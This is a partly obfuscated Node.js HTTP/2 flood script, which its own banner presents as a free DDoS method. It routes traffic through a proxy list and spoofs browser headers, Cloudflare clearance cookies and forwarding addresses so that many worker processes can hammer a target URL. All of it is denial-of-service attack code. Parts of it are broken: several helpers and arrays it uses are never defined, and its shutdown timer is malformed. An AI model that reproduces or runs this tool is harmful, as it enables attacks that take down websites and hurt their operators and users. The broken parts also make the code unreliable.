process.on("uncaughtException", function (_0x122270) {});
process.on("unhandledRejection", function (_0x5dfe5e) {});
process.on("SIGHUP", () => {
  return 1;
});
process.on("SIGCHILD", () => {
  return 1;
});
require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

const cluster = require("cluster"),
      crypto = require("crypto"),
      http2 = require("http2"),
      net = require("net"),
      tls = require("tls"),
      url = require("url"),
      fs = require("fs");

var path = require("path"),
    fileName = __filename;

process.argv.length < 7 && (console.log("node phong.js <url> <time> <requests> <threads> <proxy>".rainbow), process.exit());
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":"),
      ciphers = "GREASE:" + [defaultCiphers[2], defaultCiphers[1], defaultCiphers[0], defaultCiphers.slice(3)].join(":"),
      sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
      ecdhCurve = "GREASE:x25519:secp256r1:secp384r1",
      secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
      secureProtocol = "TLS_client_method";
"TLSv1_1_method";
"TLSv1_2_method";
"TLSv1_3_method";
const secureContextOptions = {
  "ciphers": ciphers,
  "sigalgs": sigalgs,
  "honorCipherOrder": true,
  "secureOptions": secureOptions,
  "secureProtocol": secureProtocol
},
      secureContext = tls.createSecureContext(secureContextOptions),
      headers = {};

function readLines(_0x5e4179) {
  return fs.readFileSync(_0x5e4179, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(_0x2e4b26, _0x1a17c1) {
  return Math.floor(Math.random() * (_0x1a17c1 - _0x2e4b26) + _0x2e4b26);
}

function randomElement(_0x310f7f) {
  return _0x310f7f[randomIntn(0, _0x310f7f.length)];
}

function randomCharacters(_0x11be1d) {
  output = "";

  for (let _0x18e11e = 0; _0x18e11e < _0x11be1d; _0x18e11e++) {
    output += randomElement(characters);
  }

  return output;
}

const args = {
  "target": process.argv[2],
  "time": process.argv[3],
  "rate": process.argv[4],
  "threads": process.argv[5],
  "proxy": process.argv[6],
  "cookie": process.argv[7] || undefined
},
      uap = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; DCO-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9; SO-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-N986N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; M2104K10I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; SM-A305GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; RMX2061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; CPH2413) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; Infinix X6815B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"],
      accept_header = ["*/*", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8", "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*", "text/html, application/xhtml+xml, image/jxr, */*", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1", "application/javascript, */*;q=0.8", "text/html, text/plain; q=0.6, */*; q=0.1", "application/graphql, application/json; q=0.8, application/xml; q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"],
      cache_header = ["no-cache", "no-store", "no-transform", "only-if-cached", "max-age=0", "must-revalidate", "public", "private", "proxy-revalidate"],
      platform = ["Windows", "Macintosh", "Linux", "iOS", "Android", "PlayStation 4", "iPhone", "iPad", "Other"],
      dest_header = ["audio", "audioworklet", "document", "embed", "empty", "font", "frame", "iframe", "image", "manifest", "object", "paintworklet", "report", "script", "serviceworker", "sharedworker", "style", "track", "video", "worker", "xslt", ""],
      mode_header = ["cors", "navigate", "no-cors", "same-origin", "websocket"],
      site_header = ["cross-site", "same-origin", "same-site", "none"],
      encoding_header = ["deflate, gzip;q=1.0, *;q=0.5", "gzip, deflate, br", "gzip, deflate", "*"];
var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let i = 0; i < process.argv[5]; i++) {
    cluster.fork();
  }

  console.clear();
  console.log("Telegram: @ngocphong0311 ( Free Methods DDoS )".rainbow);
  console.log("[33mTarget: [0m" + process.argv[2]);
  console.log("[33mTime: [0m" + process.argv[3]);
  console.log("[33mRate: [0m" + process.argv[4]);
  console.log("[33mThread: [0m" + process.argv[5]);
  console.log("[33mProxyFile: [0m" + process.argv[6] + " | [33mTotal(s): [0m" + proxies.length);
  console.log("--------------------------------------");
  console.log("[31mNote: [0mrecommend use good and big proxyfile if hit hard targets.");
  setTimeout(() => {}, process.argv[5] * 1000);

  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else setInterval(runFlooder);

class NetSocket {
  constructor() {}

  ["HTTP"](_0x3fd91a, _0x3c641e) {
    const _0x27971 = _0x3fd91a.address.split(":"),
          _0x3606bd = "CONNECT " + _0x3fd91a.address + ":443 HTTP/1.1\r\nHost: " + _0x3fd91a.address + ":443\r\nConnection: Keep-Alive\r\n\r\n",
          _0x48ac73 = new Buffer.from(_0x3606bd),
          _0x1ca0c1 = net.connect({
      "host": _0x3fd91a.host,
      "port": _0x3fd91a.port,
      "allowHalfOpen": true,
      "writable": true,
      "readable": true
    });

    _0x1ca0c1.setTimeout(_0x3fd91a.timeout * 20000);

    _0x1ca0c1.setKeepAlive(true, 20000);

    _0x1ca0c1.setNoDelay(true);

    _0x1ca0c1.on("connect", () => {
      _0x1ca0c1.write(_0x48ac73);
    });

    _0x1ca0c1.on("data", _0x1b2947 => {
      const _0x11ace1 = _0x1b2947.toString("utf-8"),
            _0xd6494d = _0x11ace1.includes("HTTP/1.1 200");

      if (_0xd6494d === false) {
        return _0x1ca0c1.destroy(), _0x3c641e(undefined, "403");
      }

      return _0x3c641e(_0x1ca0c1, undefined);
    });

    _0x1ca0c1.on("timeout", () => {
      return _0x1ca0c1.destroy(), _0x3c641e(undefined, "403");
    });

    _0x1ca0c1.on("error", _0x3d2fb0 => {
      return _0x1ca0c1.destroy(), _0x3c641e(undefined, "403");
    });
  }

}

const uas = uap[Math.floor(Math.floor(Math.random() * uap.length))],
      Socker = new NetSocket();
headers[":method"] = "GET";
headers[":path"] = parsedTarget.path;
headers[":scheme"] = "https";
headers.accept = accept_header[Math.floor(Math.random() * accept_header.length)];
headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
headers.pragma = "no-cache";
headers.cookie = process.argv[7];
headers["sec-ch-ua"] = uas;
headers["cf-cache-status"] = ["DYNAMIC", "BYPASS"];
headers.referer = "https://www.google.com/";
headers.priority = "u=0, 1";
headers.origin = parsedTarget.host;
headers.cookie = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
headers["cdn-loop"] = "cloudflare";
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = platform[Math.floor(Math.random() * platform.length)];
headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
headers["sec-fetch-user"] = "1";
headers["upgrade-insecure-requests"] = "1";
headers["user-agent"] = uas;
headers["x-requested-with"] = "XMLHttpRequest";

function runFlooder() {
  const _0x2bdcbf = randomElement(proxies),
        _0x568cd5 = _0x2bdcbf.split(":");

  headers[":authority"] = parsedTarget.host;
  headers["x-forwarded-for"] = _0x568cd5[0];
  headers["x-forwarded-proto"] = "https";
  const _0x3c69e0 = {
    "host": _0x568cd5[0],
    "port": _0x568cd5[1],
    "address": parsedTarget.host + ":443",
    "timeout": 100
  };
  Socker.HTTP(_0x3c69e0, (_0x54842b, _0x112c53) => {
    if (_0x112c53) return;

    _0x54842b.setKeepAlive(true, 90000);

    _0x54842b.setNoDelay(true);

    const _0x4a4a6f = {
      "enablePush": false,
      "initialWindowSize": 1073741823
    },
          _0x41a501 = {
      "port": 443,
      "ALPNProtocols": ["h2", "spdy/3.1", "http/1.1"],
      "secure": true,
      "ciphers": ciphers,
      "sigalgs": sigalgs,
      "requestCert": true,
      "socket": _0x54842b,
      "ecdhCurve": ecdhCurve,
      "honorCipherOrder": false,
      "rejectUnauthorized": false,
      "servername": url.hostname,
      "host": parsedTarget.host,
      "servername": parsedTarget.host,
      "secureOptions": secureOptions,
      "secureContext": secureContext,
      "secureProtocol": secureProtocol
    },
          _0x32b0f1 = tls.connect(443, parsedTarget.host, _0x41a501);

    _0x32b0f1.allowHalfOpen = true;

    _0x32b0f1.setNoDelay(true);

    _0x32b0f1.setKeepAlive(true, 60 * 100000);

    _0x32b0f1.setMaxListeners(0);

    const _0x955ed1 = http2.connect(parsedTarget.href, {
      "protocol": "https:",
      "settings": {
        "headerTableSize": 65536,
        "maxConcurrentStreams": 1000,
        "initialWindowSize": 6291456,
        "maxHeaderListSize": 262144,
        "enablePush": false
      },
      "maxSessionMemory": 3333,
      "maxDeflateDynamicTableSize": 4294967295,
      "createConnection": () => _0x32b0f1,
      "socket": _0x54842b
    });

    _0x955ed1.settings({
      "headerTableSize": 65536,
      "maxConcurrentStreams": 1000,
      "initialWindowSize": 6291456,
      "maxHeaderListSize": 262144,
      "enablePush": false
    });

    _0x955ed1.setMaxListeners(0);

    _0x955ed1.settings(_0x4a4a6f);

    _0x955ed1.on("connect", () => {});

    _0x955ed1.on("close", () => {
      _0x955ed1.destroy();

      _0x54842b.destroy();

      return;
    });

    _0x955ed1.on("error", _0x573efe => {
      _0x955ed1.destroy();

      _0x54842b.destroy();

      return;
    });
  });
}

const KillScript = () => process.exit();

setTimeout(KillScript * 1000);